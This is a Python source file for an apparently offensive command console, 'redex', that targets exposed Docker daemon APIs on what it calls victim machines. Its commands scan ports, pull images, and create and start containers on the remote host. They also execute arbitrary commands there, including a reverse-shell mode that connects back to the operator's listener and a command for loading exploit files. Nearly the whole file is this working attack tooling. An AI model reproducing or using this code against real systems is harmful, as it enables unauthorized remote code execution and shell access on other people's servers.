import json
import rich

from dataclasses import dataclass
from typing import Callable, Optional
from pathlib import Path

from redex.network.portscan import PortScanner
from redex.network.revshell import ReverseShellHandler
from redex.utils.constants import *
from redex.network.docker import *
from redex.data.exploit import Exploit


@dataclass
class Command(object):
    """**Command Data Class**

    Define a single command.

    Attributes
    ----------
    name : str
        The name of the command
    desc : str
        A general description of the command
    cmd : str
        The actual usage information
    """
    name : str
    cmd  : str
    desc : str
    func : Optional[Callable] = None

    def tostr(self, verbose: bool) -> str:
        s = \
          f"{self.name} - Usage: {self.cmd}\n" + \
          f"    {self.desc}\n" if verbose else f"{self.name}"

        return s
    
    def __call__(self, redex_cls, *args, **kwargs) -> None:
        self.func(redex_cls, *args, **kwargs)

## ------------------------- HELP COMMAND ------------------------
def help_cmd(redex_cls, *args, **kwargs) -> None:
    commands = redex_cls.commands.__dict__
    filters = list(map(lambda x: x.lower(), commands.keys())) \
        if len(args) == 0 \
        else list(args[0].split())
    
    c = rich.console.Console(color_system="truecolor")
    for cmd_name, cmd_object in commands.items():
        if cmd_name.lower() not in filters: continue
        if not isinstance(cmd_object, Command): continue
        c.print(cmd_object.tostr(True))


C_HELP = Command(C_HELP_NAME, C_HELP_CMD, C_HELP_DESC, func=help_cmd)
help_cmd.__doc__ = C_HELP.desc


## ------------------------- CLEAR COMMAND ------------------------
def clear_cmd(redex_cls, *args, **kwargs) -> None:
    redex_cls.console.clear()


C_CLEAR = Command(C_CLEAR_NAME, C_CLEAR_CMD,  C_CLEAR_DESC, func=clear_cmd)
clear_cmd.__doc__ = C_CLEAR.desc


## ------------------------- QUIT COMMAND ------------------------
def quit_cmd(redex_cls, *args, **kwargs) -> None:
    redex_cls.console.print("\n[*] Quitting ... ", style="bold red")
    import sys; sys.exit(0)


C_QUIT = Command(C_QUIT_NAME,C_QUIT_CMD, C_QUIT_DESC, func=quit_cmd)
quit_cmd.__doc__ = C_QUIT.desc

## ------------------------- SET COMMAND ------------------------
def set_cmd(redex_cls, *args, **kwargs) -> None:
    sets = [tuple(v.split("=")) for v in args]

    # Set the values
    for variable, value in sets:
        attr = f"s_{variable.lower()}"
        # Convert to a number if condition hold
        if value.isnumeric(): value = int(value)
        if variable == "EXPLOIT": continue
        setattr(redex_cls.session, attr, value)
        redex_cls.console.print(f"[*] Setting {variable} => {value}")


C_SET = Command(C_SET_NAME, C_SET_CMD, C_SET_DESC, func=set_cmd)
set_cmd.__doc__ = C_SET.desc

## ------------------------- SETDATA COMMAND ------------------------
def setdata_cmd(redex_cls, *args, **kwargs) -> None:
    sets = [tuple(v.split("=")) for v in args]

    for var, filename in sets:
        data = json.load(open(filename, mode="r"))
        attr = f"c_{var.lower()}"
        setattr(redex_cls.container_data, attr, data)


C_SETDATA = Command(C_SETDATA_NAME, C_SETDATA_CMD, C_SETDATA_DESC, func=setdata_cmd)
setdata_cmd.__doc__ = C_SETDATA.desc

## ------------------------- SHOW COMMAND ------------------------
def show_cmd(redex_cls, *args, **kwargs) -> None:
    filters = list(redex_cls.session.__dict__.keys())
    if len(args) > 0: filters = list(map(lambda x: "s_" + x.lower(), args[0].split()))
    for attr, value in redex_cls.session.__dict__.items():
        # Check if the attribute starts in the way we set the 
        # new variables, using the SET command, in the class.
        if not attr.startswith("s_"): continue
        if not attr.lower() in filters: continue
        attr = attr.split("_")[-1].upper()
        if isinstance(value, dict):
            redex_cls.console.print("%s =" % attr)
            redex_cls.console.print(value)
            continue

        redex_cls.console.print(f"{attr} = {str(value)}")


C_SHOW = Command(C_SHOW_NAME,C_SHOW_CMD, C_SHOW_DESC,func=show_cmd)
show_cmd.__doc__ = C_SHOW.desc


## ------------------------- SHOW COMMAND ------------------------
def showdata_cmd(redex_cls, *args, **kwargs) -> None:
    filters = list(redex_cls.container_data.__dict__.keys())
    if len(args) > 0: filters = list(map(lambda x: "c_" + x.lower(), args[0].split()))
    for attr, value in redex_cls.container_data.__dict__.items():
        # Check if the attribute starts in the way we set the 
        # new variables, using the SETDATA command, in the class.
        if not attr.startswith("c_"): continue
        if not attr.lower() in filters: continue
        attr = attr.split("_")[-1].upper()
        redex_cls.console.print("%s =" % attr)
        redex_cls.console.print(value)


C_SHOWDATA = Command(C_SHOWDATA_NAME,C_SHOWDATA_CMD, C_SHOWDATA_DESC, func=showdata_cmd)
showdata_cmd.__doc__ = C_SHOWDATA.desc


## ------------------------- SCAN COMMAND ------------------------
def scan_cmd(redex_cls, *args, **kwargs) -> None:
    remote_host = redex_cls.session.s_rhost if len(args) == 0 else args[0]
    port_scanner = PortScanner(redex_cls.console)
    port_scanner.run(remote_host)


C_SCAN = Command(C_SCAN_NAME,C_SCAN_CMD, C_SCAN_DESC, func=scan_cmd)
scan_cmd.__doc__ = C_SCAN.desc

## ------------------------- LSTIMGS COMMAND ------------------------
def lstimgs_cmd(redex_cls, *args, **kwargs) -> None:
    # Send a GET request to the remote Docker Daemon, in order
    # to obtain all the images actually downloaded on the victim machine.
    response = send_request_listimages(redex_cls.session.s_rhost, redex_cls.session.s_rport)
    filter_dictionary = dict()

    # Check if the user has also given some filters regardin
    # the expected Tag and name of images. This is the case
    # in which the user may want to check if the victim machine
    # has downloaded a particular version of an image
    if len(args):
        filters = args[0].split("=")[-1].split(",")
        filters = [(f"{f}:latest" if ":" not in f else ":".join(f.split(":"))) for f in filters]
        filter_dictionary = {f: False for f in filters}
    else:
        filters = []

    # Fill the data with all the images found in the victim machine
    # obtained as response from the previous request made to the daemon
    for data in response.json():
        for filter in filters:
            if filter in data["RepoTags"]:
                filter_dictionary[filter] = True
                break

        if len(filters) == 0:
            filter_dictionary[data["RepoTags"][0]] = True
    
    redex_cls.console.print(filter_dictionary)


C_LSTIMGS = Command(C_LSTIMGS_NAME,C_LSTIMGS_CMD, C_LSTIMGS_DESC, func=lstimgs_cmd)
lstimgs_cmd.__doc__ = C_LSTIMGS.desc


## ------------------------- PULL COMMAND ------------------------
def pull_cmd(redex_cls, *args, **kwargs) -> None:
    # Define the name of the image that the user would like to
    # pull on the victim machine. In particular if the tag
    # has not been provided, the default "latest" is used.
    if len(args) > 0:
        image = args[0]
        image = f"{image}:latest" if ":" not in image else image
    else:
        image = redex_cls.session.s_image

    # Send the request
    send_request_pull_image(
        redex_cls.session.s_rhost,redex_cls.session.s_rport, image
    )


C_PULL = Command(C_PULL_NAME,C_PULL_CMD, C_PULL_DESC,func=pull_cmd)
pull_cmd.__doc__ = C_PULL.desc


## ------------------------- CREATE COMMAND ------------------------
def create_cmd(redex_cls, *args, **kwargs) -> None:
    container_name = redex_cls.session.s_name
    container_data = redex_cls.container_data.c_default

    # First let's check that the user has provided two inputs
    # In this case the first is the name of the container, while
    # the last is the data that will be used to create the container
    if len(args) == 2:
        container_name = args[0]
        container_data_name = args[1].split('=')[-1]
        container_data = getattr(redex_cls.container_data, f"c_{container_data_name}")
    
    if len(args) == 1:
        input_arg = args[0]
        # In this case we need to check whether the input argument
        # is the name of the container or its data.
        if "=" in input_arg: # it is the container data
            container_data_name = input_arg.split('=')[-1]
            container_data = getattr(redex_cls.container_data, f"c_{container_data_name}")
        else: # Is the name of the container
            container_name = input_arg

    if container_name not in redex_cls.session.s_names:
        redex_cls.session.s_names.append(container_name)

    send_request_create_container(
        redex_cls.session.s_rhost, redex_cls.session.s_rport,
        container_name, container_data
    )


C_CREATE = Command(C_CREATE_NAME, C_CREATE_CMD, C_CREATE_DESC, func=create_cmd)
create_cmd.__doc__ = "\n".join([x.strip() for x in C_CREATE.desc.split("\n")])


## ------------------------- START COMMAND ------------------------
def start_cmd(redex_cls, *args, **kwagrs) -> None:
    container_name = redex_cls.session.s_name if len(args) == 0 else args[0]

    # If the container name is not in the list of all names, this means that
    # the container has not been created yet.
    if not container_name in redex_cls.session.s_names:
        redex_cls.console.print(
            f"[*] Error. Container: {container_name} does not exists", style="bold red"
        )
        return
    
    # Send the request to start the specified container
    send_request_start_container(
        redex_cls.session.s_rhost, redex_cls.session.s_rport, container_name
    )
    
    redex_cls.console.print(
        f"[*] [green]Container {container_name.upper()} Has stated[/green]"
    )


C_START = Command(C_START_NAME,C_START_CMD, C_START_DESC, func=start_cmd)
start_cmd.__doc__ = C_START.desc


## ------------------------- STOP COMMAND ------------------------
def stop_cmd(redex_cls, *args, **kwargs) -> None:
    addr  = f"{redex_cls.session.s_rhost}:{redex_cls.session.s_rport}"
    container_name = redex_cls.session.s_name if len(args) == 0 else args[0]
    if not container_name in redex_cls.session.s_names:
        redex_cls.console.print(
            f"[*] Error. Container: {container_name} does not exists", style="bold red"
        )
        return
    
    # Send the request to stop the specified container
    send_request_stop_container(
        redex_cls.session.s_rhost, redex_cls.session.s_rport, container_name
    )
    
    redex_cls.console.print(
        f"[*] [green]Container {container_name.upper()} Has been stopped[/green]"
    )


C_STOP = Command(C_STOP_NAME,C_STOP_CMD, C_STOP_DESC, func=stop_cmd)
stop_cmd.__doc__ = C_STOP.desc


## ------------------------- LSTCONTS COMMAND ------------------------
def lstconts_cmd(redex_cls, *args, **kwargs) -> None:
    # Initialize some variables useful later
    show_all, filters, args = False, dict(), list(args)

    # In this case the user may would like to see all the containers 
    if "all" in args:
        show_all = True
        args.remove("all")

    maps = {"imgs" : "ancestor", "nets" : "network", "status" : "status"}
    for user_argument in args:
        name, filter_val = user_argument.split("=")
        if name not in maps:
            redex_cls.console.print(f"[red]No argument with name: {name}[/red]")
            raise KeyError

        real_name = maps[name]
        filters[real_name] = filter_val.split(",")
    
    params = {"all" : show_all, "filters" : json.dumps(filters)}
    response = send_request_list_containers(
        redex_cls.session.s_rhost, redex_cls.session.s_rport, params
    )

    containers = response.json()
    if not containers:
        redex_cls.console.print(f"[*] [yellow]Empty Result[/yellow]")
        return
    
    try:

        containers_content = dict()   
        for container in containers:
            infos = extrapolate_information_from_json(container)
            containers_content[infos["Name"]] = infos
        
        redex_cls.console.print(containers_content)

    except KeyError:
        redex_cls.console.print("[red]Command has failed![/red]")


C_LSTCONTS = Command(C_LSTCONTS_NAME,C_LSTCONTS_CMD, C_LSTCONTS_DESC, func=lstconts_cmd)
lstconts_cmd.__doc__ = C_LSTCONTS.desc

## ------------------------- REMOVE COMMAND ------------------------
def remove_cmd(redex_cls, *args, **kwargs) -> None:
    if len(args) > 0:
        names = list(args)[0].split("=")[-1].split(",")
    else:
        names = [redex_cls.session.s_name]
    
    send_request_remove_containers(
        redex_cls.session.s_rhost, redex_cls.session.s_rport, names
    )


C_REMOVE = Command(C_REMOVE_NAME, C_REMOVE_CMD, C_REMOVE_DESC, func=remove_cmd)
remove_cmd.__doc__ = C_REMOVE.desc

## ------------------------- INSPECT COMMAND ------------------------
def inspect_cmd(redex_cls, *args, **kwargs) -> None:
    if len(args) > 0:
        names = list(args)[0].split("=")[-1].split(",")
    else:
        names = [redex_cls.session.s_name]

    send_request_inspect_containers(
        redex_cls.session.s_rhost, redex_cls.session.s_rport, names
    )


C_INSPECT = Command(C_INSPECT_NAME, C_INSPECT_CMD, C_INSPECT_DESC, func=inspect_cmd)
inspect_cmd.__doc__ = C_INSPECT.desc

## ------------------------- EXECUTE COMMAND ------------------------
def execute_cmd(redex_cls, *args, **kwargs) -> None:
    command = redex_cls.session.s_command 
    if len(args) == 1 and "=" in args[0]: command = args[0].split("=")[-1]
    command_arguments = []

    # Check if command is either one between reverse shell or upload
    match command:
        case "revshell":
            command_arguments = [redex_cls.session.s_lhost, redex_cls.session.s_lport]
        case "upload":
            command_arguments = [args[0], args[1]]
        case _: pass

    # Format the command if it is one of the default ones
    cmd = command
    if command in redex_cls.command_types:
        cmd = redex_cls.command_types[command].format(*command_arguments)

    command_exec_data = redex_cls.container_data.c_default['exec']
    command_exec_data["Cmd"][2] = f'{cmd}'
    
    redex_cls.console.print(f"[*] Executing command: [yellow]'{cmd}'[/yellow]")

    # Let's send the request to create the execution instance
    exec_id = send_request_create_exec(
        redex_cls.session.s_rhost, redex_cls.session.s_rport,
        command_exec_data, redex_cls.session.s_name
    )
    redex_cls.console.print(f"[*] [green]Exec instance created with ID[/green]: \n{exec_id}")

    if command == "revshell":
        try:
            addr = f"{redex_cls.session.s_rhost}:{redex_cls.session.s_rport}"
            rvshell = ReverseShellHandler(redex_cls.session.s_lhost, redex_cls.session.s_lport)
            rvshell.handle_rv( redex_cls.container_data.c_default["exec_start"], addr, exec_id)
            return None
        except Exception as e:
            print(e)

    send_request_start_exec(
        redex_cls.session.s_rhost, redex_cls.session.s_rport,
        exec_id, redex_cls.container_data.c_default
    )

    return None


C_EXECUTE = Command(C_EXECUTE_NAME,C_EXECUTE_CMD, C_EXECUTE_DESC, func=execute_cmd)
execute_cmd.__doc__ = C_EXECUTE.desc

## ------------------------- UPLOAD COMMAND ------------------------
def upload_cmd(redex_cls, *args, **kwargs) -> None:
    ...

C_UPLOAD = Command(C_UPLOAD_NAME, C_UPLOAD_CMD, C_UPLOAD_DESC, func=upload_cmd)
upload_cmd.__doc__ = C_UPLOAD.desc

## ------------------------- USE COMMAND ------------------------
def use_cmd(redex_cls, *args, **kwargs) -> None:
    ...

C_USE = Command(C_USE_NAME, C_USE_CMD, C_USE_DESC, func=use_cmd)
use_cmd.__doc__ = C_USE.desc

## ------------------------- ADDEXPLOIT COMMAND ------------------------
def addexploit_cmd(redex_cls, *args, **kwargs) -> None:
    # Check that all required arguments have been given
    if len(args) < 1:
        redex_cls.console.print(
            "[red]NAME and FILE arguments are both required![/red]"
        )
        return

    # Obtain the given arguments and checks that the exploit
    # actually exists in the local host system
    exploit_name, exploit_path = args[0].split()
    exploit_path = Path(exploit_path).absolute()
    if not exploit_path.exists():
        redex_cls.console.print(f"[red]{exploit_path} does not exists![/red]")
        return
    
    exploit_data = Exploit(exploit_path)
    setattr(redex_cls.exploit_hdl, exploit_name, exploit_data)
    redex_cls.console.print(f"Added new exploit {exploit_name} -> {exploit_path}")


C_ADDEXPLOIT = Command(C_ADDEXPLOIT_NAME,C_ADDEXPLOIT_CMD, C_ADDEXPLOIT_DESC, func=addexploit_cmd)
addexploit_cmd.__doc__ = C_ADDEXPLOIT.desc

## ------------------------- SHOWCMD COMMAND ------------------------
def showcmd_cmd(redex_cls, *args, **kwargs) -> None:
    commands = redex_cls.commands.__dict__
    c = rich.console.Console(color_system="truecolor")
    for _, cmd_object in commands.items():
        if not isinstance(cmd_object, Command): continue
        c.print(cmd_object.tostr(False))


C_SHOWCMD = Command(C_SHOWCMD_NAME, C_SHOWCMD_CMD, C_SHOWCMD_DESC, func=showcmd_cmd)
showcmd_cmd.__doc__ = C_SHOWCMD.desc


@dataclass(frozen=True)
class RedexCommands(object):
    HELP       : Command = C_HELP
    CLEAR      : Command = C_CLEAR
    QUIT       : Command = C_QUIT
    SET        : Command = C_SET
    SETDATA    : Command = C_SETDATA
    SHOW       : Command = C_SHOW
    SHOWDATA   : Command = C_SHOWDATA
    SCAN       : Command = C_SCAN
    LSTIMGS    : Command = C_LSTIMGS
    PULL       : Command = C_PULL
    CREATE     : Command = C_CREATE
    START      : Command = C_START
    STOP       : Command = C_STOP
    LSTCONTS   : Command = C_LSTCONTS
    REMOVE     : Command = C_REMOVE
    INSPECT    : Command = C_INSPECT
    UPLOAD     : Command = C_UPLOAD
    USE        : Command = C_USE
    ADDEXPLOIT : Command = C_ADDEXPLOIT
    SHOWCMD    : Command = C_SHOWCMD
    EXECUTE    : Command = C_EXECUTE

    def __getitem__(self, key: str) -> Command:
        """ Returns the corresponding command """
        commands = { 
            k.lower() : v  for k, v in self.__dict__.items() 
            if isinstance(v, Command) 
        }

        if key.lower() not in commands.keys():
            raise KeyError(f"'{key}' is not a command")
        
        return commands[key]